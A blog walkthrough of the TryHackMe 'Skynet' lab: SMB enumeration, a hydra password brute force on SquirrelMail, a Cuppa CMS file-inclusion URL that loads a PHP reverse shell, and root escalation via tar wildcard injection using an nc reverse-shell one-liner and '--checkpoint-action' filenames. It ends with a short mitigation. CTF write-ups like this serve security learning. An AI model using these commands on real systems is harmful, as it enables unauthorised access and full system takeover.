---
layout: post
author: dalemazza
title: THM - Skynet Walkthrough
date: 2020-11-25
category: THM
tags: THM
published: true
excerpt_separator: <!--more-->
---
<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/N28z4gw.png">
</p>

* Platform: **THM**
* Difficulty: **EASY**
* Flags: **5**


This is an easy rated room on [Try Hack Me](https://tryhackme.com/room/skynet). This box was simple with a tricky to spot priv esc method.
<!--more-->
This challenge includes the following techniques:  
* nmap
* ffuf
* Reverse-php-shells
* smbclient
* hydra

As always I start with an `nmap` scan.

```bash
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING UIDL SASL AUTH-RESP-CODE RESP-CODES TOP CAPA
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: SASL-IR more ID have post-login LOGIN-REFERRALS capabilities Pre-login LITERAL+ OK IDLE IMAP4rev1 LOGINDISABLEDA0001 listed ENABLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m58s, deviation: 3h27m51s, median: -1s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2020-11-30T15:07:36-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-11-30T21:07:36
|_  start_date: N/A
```

After enumerating the site I found a few interesting directories
 - /admin
 - /squirrel This forwarded me to the squirrel mail client

 Lets look at SMB shares on port 445, nmap revealed it has anonymous access.

 ```bash
 smbclient -L \\\\10.10.36.101\\
 Enter WORKGROUP\kali password:

 	Sharename       Type      Comment
 	---------       ----      -------
 	print$          Disk      Printer Drivers
 	anonymous       Disk      Skynet Anonymous Share
 	milesdyson      Disk      Miles Dyson Personal Share
 	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
 Reconnecting with SMB1 for workgroup listing.

 	Server               Comment
 	---------            -------

 	Workgroup            Master
 	---------            -------
 	WORKGROUP            SKYNET
 ```
The share "anonymous" has anonymous access!

It contains some log files and an "attention.txt" which reads
```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

That is interesting!

Also in this directory is a "logs.txt" which looks like it is a set of passwords.

---
## Brute force squirrel mail with hydra
---

The `attention.txt` is by a person called "milesdyson" lets try all theses passwords against that username in the mail login. You can use hydra to perform brute logon attempts using the `http-post-form` module which just attempts to login with milesdyson with every password you supply it, Like so.

```bash
kali@kali:~/thm$ hydra 10.10.36.101 -l milesdyson -P log1.txt http-post-form "/squirrelmail/src/login.php:username=^USER^&password=^PASS^&Login=Login:S=" -f -V
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-30 16:36:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.36.101:80/squirrelmail/src/login.php:username=^USER^&password=^PASS^&Login=Login:S=
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
[ATTEMPT] target 10.10.36.101 - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
[80][http-post-form] host: 10.10.36.101   login: milesdyson   password: cyborg007haloterminator
[STATUS] attack finished for 10.10.36.101 (valid pair found)
```
We have a hit!

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/Eixg1Ic.png">
</p>

The account has 3 emails in the inbox.

One contains an email with a new password for smb.

Log back into SMB with the `milesdyson` share. This contains some random files. One sticks out called `important.txt`

```bash
cat important.txt
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
Number 3 is a good life tip!

Let's see what is in this new directory

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/SWTe6rq.png">
</p>

ffuf reveals a new hidden directory

```
index.html              [Status: 200, Size: 418, Words: 45, Lines: 16]
administrator           [Status: 301, Size: 337, Words: 20, Lines: 10]
```
<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/qJ4ftJP.png">
</p>

This is cuppa cms. Inspecting this source code reveals a forgot password form that is commented out. After de-commenting it it doesnt seem to work still.

Let's check for Exploits
```bash
Searchsloit revealed 1 exploit
searchsploit cuppa
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion | php/webapps/25971.txt
```
After googling for "cuppa cms exploit" I found this [https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/1306-exploits/cuppacms-rfi.txt](https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/1306-exploits/cuppacms-rfi.txt)

Using this I can call a file hosted on my machine and execute it. **RCE**

I host a reverse php shell on my machine. This is my go to php shell [https://github.com/jivoi/pentest/blob/master/shell/rshell.php](https://github.com/jivoi/pentest/blob/master/shell/rshell.php)

Server the reverse php with the following. Make sure you are in the same dir as the shell
```bash
sudo python3 -m http.server 80
####Notice the sudo on the command, this allows you to use the port 80
```
Browse the the exploitable page
```
http://10.10.36.101/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.4.164/r.php
```

<p align="center">
  <img class="image" width="auto" height="auto" src="https://i.imgur.com/e2vVwPp.png">
</p>

We now have a low priv www-data shell!

---
## Privesc
---
One thing to note here is that you cannot `cd` into milesdyson's home dir. However you can cat the flag like so.

```bash
cat /home/milesdyson/user.txt
```
After checking the `crontab` something stood out
```bash
www-data@skynet:/usr/share$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
Root has a `backup.sh` running from milesdyson home dir. You can cat the script to see what it is doing.

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
This script opens bash then cd's into the `/var/www folder` then zips everything into a backup.tgz.

Lucky for me this script is zipping a folder I have full rights for. After playing around for a while I stumbled across [this](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) article which shows an exploit with the "*" wildcard for tar.

This looks promising! I first made these files in the `/var/www/html` folder
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.4.164 1234 >/tmp/f' > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```
Due to tar having the wildcard `*` in place it will zip the files and read the filenames and see `--checkpoint-action=exec=sh` and run this as an argument in turn running the file you point it to. We can use this to run cmd's as `root`.

```bash
www-data@skynet:/var/www/html$ ls -la
ls -la
total 76
-rw-rw-rw- 1 www-data www-data     0 Dec  1 13:40 --checkpoint-action=exec=sh shell.sh
-rw-rw-rw- 1 www-data www-data     0 Dec  1 13:38 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Dec  1 13:57 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data    79 Dec  1 13:59 shell.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
```

Now catch the shell with netcat and wait for the cronjob to proc

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/QpbosL9.png">
</p>

**ROOTED!**
---
## Protect from wildcard exploits
---
To protect from wildcards you can use the follwing to force the wildcard to see the directories instead of thinking it is a command.

```bash
####Exploitable####
tar cf /home/milesdyson/backups/backup.tgz *

####Protection from the attack####
tar cf /home/milesdyson/backups/backup.tgz ./*
```
